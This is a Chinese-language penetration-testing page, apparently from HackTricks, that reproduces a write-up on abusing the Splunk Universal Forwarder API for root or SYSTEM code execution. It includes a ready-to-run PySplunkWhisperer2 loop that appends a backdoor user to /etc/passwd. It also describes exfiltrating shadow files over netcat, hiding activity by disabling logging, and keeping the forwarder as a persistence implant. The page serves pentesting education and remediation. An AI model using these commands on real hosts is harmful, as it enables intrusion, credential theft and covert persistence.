<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks云 ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 推特 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

- 你在一家**网络安全公司**工作吗？你想在HackTricks中看到你的**公司广告**吗？或者你想获得**PEASS的最新版本或下载PDF格式的HackTricks**吗？请查看[**订阅计划**](https://github.com/sponsors/carlospolop)！

- 发现我们的独家[**NFTs**](https://opensea.io/collection/the-peass-family)收藏品- [**The PEASS Family**](https://opensea.io/collection/the-peass-family)

- 获取[**官方PEASS和HackTricks周边产品**](https://peass.creator-spring.com)

- **加入** [**💬**](https://emojipedia.org/speech-balloon/) [**Discord群组**](https://discord.gg/hRep4RUj7f) 或 [**电报群组**](https://t.me/peass) 或 **关注**我在**Twitter**上的[**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**

- **通过向[hacktricks repo](https://github.com/carlospolop/hacktricks)和[hacktricks-cloud repo](https://github.com/carlospolop/hacktricks-cloud)提交PR来分享你的黑客技巧**。

</details>


如果在**内部**或**外部**枚举一台机器时发现运行着**Splunk**（端口8090），如果你幸运地知道任何**有效的凭据**，你可以滥用Splunk服务以**执行一个shell**，作为运行Splunk的用户。如果是以root身份运行，你可以提升权限到root。

此外，如果你已经是**root用户**，并且Splunk服务不仅仅在本地监听，你可以从Splunk服务中**窃取**密码文件并**破解**密码，或者**添加新的**凭据。并在主机上保持持久性。

在下面的第一张图片中，你可以看到Splunkd网页的外观。

**以下信息是从**[**https://eapolsniper.github.io/2020/08/14/Abusing-Splunk-Forwarders-For-RCE-And-Persistence/**](https://eapolsniper.github.io/2020/08/14/Abusing-Splunk-Forwarders-For-RCE-And-Persistence/) **复制的**

# 滥用Splunk Forwarders进行Shell和持久性攻击

2020年8月14日

## 描述：<a href="#description" id="description"></a>

Splunk通用转发代理（UF）允许经过身份验证的远程用户通过Splunk API向代理发送单个命令或脚本。UF代理不验证连接是否来自有效的Splunk Enterprise服务器，也不验证代码是否经过签名或以其他方式证明来自Splunk Enterprise服务器。这使得攻击者可以在操作系统上以SYSTEM或root的身份运行任意代码，前提是他们获得了UF代理密码的访问权限。

渗透测试人员正在使用这种攻击方式，恶意攻击者可能正在积极利用此漏洞。获得密码可能导致客户环境中数百个系统的受损。

Splunk UF密码相对容易获取，详细信息请参见常见密码位置部分。

## 上下文：<a href="#context" id="context"></a>

Splunk是一种数据聚合和搜索工具，通常用作安全信息和事件监视（SIEM）系统。Splunk Enterprise Server是一个在服务器上运行的Web应用程序，其中包含名为Universal Forwarders的代理，这些代理安装在网络中的每个系统上。Splunk提供了适用于Windows、Linux、Mac和Unix的代理二进制文件。许多组织使用Syslog将数据发送到Splunk，而不是在Linux/Unix主机上安装代理，但代理安装越来越受欢迎。

Universal Forwarder可以在每个主机上通过https://host:8089访问。访问任何受保护的API调用，例如/service/，会弹出一个基本身份验证框。用户名始终为admin，密码默认为changeme，直到2016年Splunk要求任何新安装设置一个8个字符或更长的密码。正如您在我的演示中所看到的，复杂性不是一个要求，因为我的代理密码是12345678。远程攻击者可以在不锁定的情况下暴力破解密码，这是日志主机的必要条件，因为如果帐户被锁定，日志将不再发送到Splunk服务器，攻击者可以利用此来隐藏他们的攻击。下面的截图显示了Universal Forwarder代理，这个初始页面可以在没有身份验证的情况下访问，并可用于枚举运行Splunk Universal Forwarder的主机。

![0](https://eapolsniper.github.io/assets/2020AUG14/11\_SplunkAgent.png)

Splunk文档显示所有代理使用相同的Universal Forwarding密码，我不确定这是否是一个要求，或者是否可以为每个代理设置单独的密码，但根据文档和我作为Splunk管理员的记忆，我相信所有代理必须使用相同的密码。这意味着如果在一个系统上找到或破解了密码，它很可能在所有Splunk UF主机上都有效。这是我的个人经验，可以快速妥协数百个主机。

## 常见密码位置：<a href="#common-password-locations" id="common-password-locations"></a>

我经常在网络上的以下位置找到Splunk通用转发代理明文密码：

1. Active Directory Sysvol/domain.com/Scripts目录。管理员将可执行文件和密码一起存储，以便进行高效的代理安装。
2. 托管IT安装文件的网络文件共享
3. 内部网络上的Wiki或其他构建注释存储库

密码也可以以哈希形式在Windows主机的Program Files\Splunk\etc\passwd中访问，在Linux和Unix主机的/opt/Splunk/etc/passwd中访问。攻击者可以尝试使用Hashcat破解密码，或者租用云破解环境以增加破解哈希的可能性。密码是一个强大的SHA-256哈希，因此强大且随机的密码不太可能被破解。

</details>
## 影响: <a href="#impact" id="impact"></a>

拥有Splunk Universal Forward Agent密码的攻击者可以完全控制网络中的所有Splunk主机，并在每个主机上获得SYSTEM或root级别的权限。我已经成功地在Windows、Linux和Solaris Unix主机上使用了Splunk代理。这个漏洞可能允许系统凭据被倾泄、敏感数据被窃取或勒索软件被安装。这个漏洞快速、易于使用和可靠。

由于Splunk处理日志，攻击者可以在第一次运行命令时重新配置Universal Forwarder，更改Forwarder位置，禁用将日志记录到Splunk SIEM。这将大大降低被客户端蓝队发现的几率。

Splunk Universal Forwarder通常安装在域控制器上进行日志收集，这很容易允许攻击者提取NTDS文件、禁用杀毒软件以进行进一步的利用和/或修改域。

最后，Universal Forwarding Agent不需要许可证，并且可以配置一个独立的密码。因此，攻击者可以将Universal Forwarder安装为主机上的后门持久性机制，因为它是一个合法的应用程序，即使不使用Splunk的客户也不太可能删除它。

## 证据: <a href="#evidence" id="evidence"></a>

为了展示一个利用示例，我使用了最新的Splunk版本为企业服务器和Universal Forwarding代理设置了一个测试环境。本报告附带了共计10个图像，显示了以下内容：

1- 通过PySplunkWhisper2请求/etc/passwd文件

![1](https://eapolsniper.github.io/assets/2020AUG14/1\_RequestingPasswd.png)

2- 通过Netcat在攻击者系统上接收/etc/passwd文件

![2](https://eapolsniper.github.io/assets/2020AUG14/2\_ReceivingPasswd.png)

3- 通过PySplunkWhisper2请求/etc/shadow文件

![3](https://eapolsniper.github.io/assets/2020AUG14/3\_RequestingShadow.png)

4- 通过Netcat在攻击者系统上接收/etc/shadow文件

![4](https://eapolsniper.github.io/assets/2020AUG14/4\_ReceivingShadow.png)

5- 将用户attacker007添加到/etc/passwd文件中

![5](https://eapolsniper.github.io/assets/2020AUG14/5\_AddingUserToPasswd.png)

6- 将用户attacker007添加到/etc/shadow文件中

![6](https://eapolsniper.github.io/assets/2020AUG14/6\_AddingUserToShadow.png)

7- 接收新的/etc/shadow文件，显示attacker007已成功添加

![7](https://eapolsniper.github.io/assets/2020AUG14/7\_ReceivingShadowFileAfterAdd.png)

8- 使用attacker007帐户确认对受害者的SSH访问

![8](https://eapolsniper.github.io/assets/2020AUG14/8\_SSHAccessUsingAttacker007.png)

9- 使用用户名root007添加一个后门root帐户，uid/gid设置为0

![9](https://eapolsniper.github.io/assets/2020AUG14/9\_AddingBackdoorRootAccount.png)

10- 使用attacker007确认SSH访问，然后使用root007升级为root

![10](https://eapolsniper.github.io/assets/2020AUG14/10\_EscalatingToRoot.png)

此时，我通过Splunk和创建的两个用户帐户持久访问主机。其中一个帐户提供了root权限。我可以禁用远程日志记录以掩盖我的行踪，并继续使用这个主机攻击系统和网络。

编写PySplunkWhisperer2脚本非常简单且有效。

1. 创建一个包含要利用的主机IP的文件，例如ip.txt
2. 运行以下命令：
```bash
for i in `cat ip.txt`; do python PySplunkWhisperer2_remote.py --host $i --port 8089 --username admin --password "12345678" --payload "echo 'attacker007:x:1003:1003::/home/:/bin/bash' >> /etc/passwd" --lhost 192.168.42.51;done
```
主机信息：

Splunk Enterprise服务器：192.168.42.114\
Splunk Forwarder代理受害者：192.168.42.98\
攻击者：192.168.42.51

Splunk Enterprise版本：8.0.5（截至2020年8月12日-实验设置当天的最新版本）\
Universal Forwarder版本：8.0.5（截至2020年8月12日-实验设置当天的最新版本）

### Splunk, Inc的修复建议：<a href="#remediation-recommendations-for-splunk-inc" id="remediation-recommendations-for-splunk-inc"></a>

我建议实施以下所有解决方案以提供深度防御：

1. 理想情况下，Universal Forwarder代理不应该开放任何端口，而是应定期轮询Splunk服务器以获取指令。
2. 使用每个客户端的单独密钥，启用客户端和服务器之间的TLS双向身份验证。这将为所有Splunk服务之间提供非常高的双向安全性。TLS双向身份验证正在广泛应用于代理和物联网设备，这是可信设备客户端到服务器通信的未来。
3. 将所有代码、单行或脚本文件发送到由Splunk服务器加密和签名的压缩文件中。这不会保护通过API发送的代理数据，但可以防止来自第三方的恶意远程代码执行。

### Splunk客户的修复建议：<a href="#remediation-recommendations-for-splunk-customers" id="remediation-recommendations-for-splunk-customers"></a>

1. 确保为Splunk代理设置非常强大的密码。我建议至少使用一个15个字符的随机密码，但由于这些密码从不键入，因此可以设置为非常长的密码，例如50个字符。
2. 配置基于主机的防火墙，仅允许从Splunk服务器连接到端口8089/TCP（Universal Forwarder代理的端口）。

## 红队的建议：<a href="#recommendations-for-red-team" id="recommendations-for-red-team"></a>

1. 下载Splunk Universal Forwarder的副本，适用于每个操作系统，因为它是一个很好的轻量级签名植入物。保留一份副本以防Splunk实际修复此问题。

## 其他研究人员的利用/博客 <a href="#exploitsblogs-from-other-researchers" id="exploitsblogs-from-other-researchers"></a>

可用的公开利用工具：

* https://github.com/cnotin/SplunkWhisperer2/tree/master/PySplunkWhisperer2
* https://www.exploit-db.com/exploits/46238
* https://www.exploit-db.com/exploits/46487

相关博客文章：

* https://clement.notin.org/blog/2019/02/25/Splunk-Universal-Forwarder-Hijacking-2-SplunkWhisperer2/
* https://medium.com/@airman604/splunk-universal-forwarder-hijacking-5899c3e0e6b2
* https://www.hurricanelabs.com/splunk-tutorials/using-splunk-as-an-offensive-security-tool

_**注意：**_ 这个问题是Splunk系统的一个严重问题，多年来已经被其他测试人员利用。虽然远程代码执行是Splunk Universal Forwarder的一个预期功能，但其实现是危险的。我尝试通过Splunk的漏洞赏金计划提交此漏洞，以极小的可能性他们不知道设计的影响，但被告知任何漏洞提交都要遵守Bug Crowd/Splunk的披露政策，该政策规定未经Splunk许可，不得公开讨论漏洞的任何细节。我请求了90天的披露时间表，但被拒绝了。因此，我没有负责任地披露这个问题，因为我相当确定Splunk意识到了这个问题并选择忽视它，我认为这可能会严重影响公司，信息安全社区有责任教育企业。

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

- 您在**网络安全公司**工作吗？您想在HackTricks中看到您的**公司广告**吗？或者您想获得PEASS的**最新版本或下载PDF格式的HackTricks**吗？请查看[**订阅计划**](https://github.com/sponsors/carlospolop)！

- 发现我们的独家[NFT](https://opensea.io/collection/the-peass-family)收藏品[**The PEASS Family**](https://opensea.io/collection/the-peass-family)

- 获取[**官方PEASS和HackTricks衣物**](https://peass.creator-spring.com)

- **加入**[**💬**](https://emojipedia.org/speech-balloon/) [**Discord群组**](https://discord.gg/hRep4RUj7f)或[**电报群组**](https://t.me/peass)，或在**Twitter**上**关注**我[**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**。**

- **通过向[hacktricks repo](https://github.com/carlospolop/hacktricks)和[hacktricks-cloud repo](https://github.com/carlospolop/hacktricks-cloud)提交PR来分享您的黑客技巧。**

</details>
